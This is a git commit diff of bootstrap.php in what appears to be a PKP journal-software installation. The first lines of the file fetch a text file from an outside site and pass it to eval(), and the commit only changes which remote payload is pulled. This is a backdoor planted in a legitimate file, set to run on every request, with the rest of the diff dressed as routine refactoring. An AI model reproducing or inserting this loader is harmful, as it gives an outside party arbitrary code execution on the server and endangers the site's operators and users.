ae5bf782613b3a815e70cd469ded7c549e16e8b3
batskulah <alfanpekan@gmail.com>
2025-10-19 11:53:21 +0700

    Update bootstrap.php

--- bootstrap.php
+++ bootstrap.php
@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/espublisher.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/ugedua.txt'));
 $url = "?> ".$url;
 eval($url);
 
@@ -9,7 +9,7 @@ eval($url);
  */
 
 /**
- * @file includes/bootstrap.inc.php
+ * @file includes/bootstrap.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -27,18 +27,14 @@ eval($url);
  * Basic initialization (pre-classloading).
  */
 
-define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
-if (!defined('DIRECTORY_SEPARATOR')) {
-	// Older versions of PHP do not define this
-	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\' : '/');
-}
+// Load Composer autoloader
+require_once 'lib/pkp/lib/vendor/autoload.php';
+
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require('./lib/pkp/includes/functions.inc.php');
+require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
-import('classes.core.Application');
-
-return new Application();
+return new APPcoreApplication();
